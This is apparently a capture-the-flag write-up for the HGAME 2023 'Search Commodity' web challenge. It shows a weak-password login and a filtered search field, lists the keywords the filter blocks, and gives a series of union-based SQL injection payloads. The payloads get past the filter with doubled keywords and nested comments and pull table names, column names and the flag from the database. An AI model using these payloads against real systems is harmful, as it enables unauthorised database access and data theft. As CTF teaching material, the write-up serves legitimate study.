# [HGAME2023]Search Commodity
![](<./img/Pasted image 20230201093828.png>)

![](<./img/Pasted image 20230201094021.png>)

这里是弱密码爆破

```
Username: user01
Password: admin123
```

```
/home
```

![](<./img/Pasted image 20230201094125.png>)

```
1
```

```
hard disk 1
```

```
2
```

```
toffee bag 3
```

```
0
```

```
Not Found 0
```

```
0select1
```

```
hard disk 1
```

推测存在字符串过滤

测试可得以下黑名单

```
select
union
from
or
where
database
<space>
<
>
=
/**/
```

因为只是常规的查找替换，可以通过套娃来绕过

```
0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,2,3
```

```
2 3
```

注入点为第二和第三列

套出数据库

```
0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,datadatabasebase(),3
```

```
se4rch 3
```

查询`se4rch`的表

```
0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(table_name),3/*/**/*/frfromom/*/**/*/infoorrmation_schema.tables/*/**/*/whwhereere/*/**/*/table_schema/*/**/*/like/*/**/*/'se4rch'
```

```
5ecret15here,L1st,user1nf0 3
```

```
0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(column_name),3/*/**/*/frfromom/*/**/*/infoorrmation_schema.columns/*/**/*/whwhereere/*/**/*/table_name/*/**/*/like/*/**/*/'5ecret15here'
```

```
f14gggg1shere 3
```

```
0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(f14gggg1shere),3/*/**/*/frfromom/*/**/*/se4rch.5ecret15here
```

```
hgame{4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!} 3
```
